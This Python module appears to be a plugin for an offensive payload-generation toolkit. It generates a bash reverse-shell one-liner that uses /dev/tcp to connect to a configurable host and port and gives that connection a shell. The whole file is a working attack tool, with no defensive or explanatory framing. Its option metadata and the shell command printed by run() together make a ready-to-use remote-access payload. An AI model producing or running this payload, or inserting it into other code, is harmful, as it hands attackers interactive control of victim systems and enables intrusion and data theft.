#!/usr/bin/env python3
# -*- coding: utf-8 -*-


# Metadata for a direct TCP-based reverse shell tool
metadata = {
    "name": "DirectTCPShell Reverse Shell",
    "description": "A direct TCP-based reverse shell that establishes a raw socket connection for executing commands remotely.",
    "authors": ["DrDataYE"],
    "date": "2023-04-01",
    "license": "Custom Intellectual License",
    "references": [
        {"type": "url", "ref": "https://github.com/t3l3machus/hoaxshell"},
        {"type": "url", "ref": "https://revshells.com"},
    ],
    "options": {
        "lhost": {
            "type": "address",
            "description": "Target host address for the reverse shell connection",
            "required": True,
            "default": "0.0.0.0",
        },
        "lport": {
            "type": "int",
            "description": "Listening port on the target host for incoming connections",
            "required": False,
            "default": 6501,
        },
        "encode": {
            "type": "string",
            "description": "Encoding method for transmitted commands",
            "required": False,
            "default": "utf-8",
        },
    },
}


class Encoder:
    pass


def run(args):
    """Execute the direct TCP reverse shell command based on provided arguments"""
    lhost = args.get("lhost", metadata["options"]["lhost"]["default"])
    lport = args.get("lport", metadata["options"]["lport"]["default"])
    encode = args.get("encode", metadata["options"]["encode"]["default"])

    # Generate the direct TCP reverse shell command
    tcp_shell_command = (
        f"0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; sh <&196 >&196 2>&196"
    )
    print(tcp_shell_command)
